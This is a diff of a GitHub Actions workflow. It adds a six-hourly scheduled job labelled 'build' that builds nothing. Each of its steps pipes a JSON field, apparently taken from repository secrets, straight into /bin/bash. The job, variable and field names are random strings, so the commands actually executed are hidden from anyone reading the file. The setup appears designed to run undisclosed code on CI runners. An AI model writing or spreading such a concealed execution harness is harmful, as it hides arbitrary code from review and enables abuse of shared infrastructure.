@@ -2,24 +2,21 @@ name: zhangduanxiu4353
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 3/6 * * *'
-jobs:  # 25904
+    - cron: '58 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhangduanxiu4353
         env:
-          yqmy7: ${{ secrets.yqmy7 }}
+          f44: ${{ secrets.f44 }}
         run: |
-          echo $yqmy7 | jq -r .o12 | /bin/bash
-          echo $omd34 | jq -r .i074 | /bin/bash
-          echo $xkfk9522 | jq -r .uu4 | /bin/bash
-          echo $ojttf1322 | jq -r .st2 | /bin/bash
-          echo $tzqr78964 | jq -r .ykgav3603 | /bin/bash
-          echo $ty36449 | jq -r .ds06 | /bin/bash
-          echo $hux490 | jq -r .gmuv9 | /bin/bash
-          echo $bgwm3 | jq -r .cco7921 | /bin/bash
-          echo $zflb1519 | jq -r .hcprr62107 | /bin/bash
+          echo $f44 | jq -r .feff9 | /bin/bash
+          echo $jhkdp7924 | jq -r .fbh52932 | /bin/bash
+          echo $uvf8 | jq -r .fa0 | /bin/bash
+          echo $ghop7 | jq -r .f41249 | /bin/bash
+          echo $bch52735 | jq -r .i0 | /bin/bash
+          echo $ht8 | jq -r .bdvd86 | /bin/bash
 
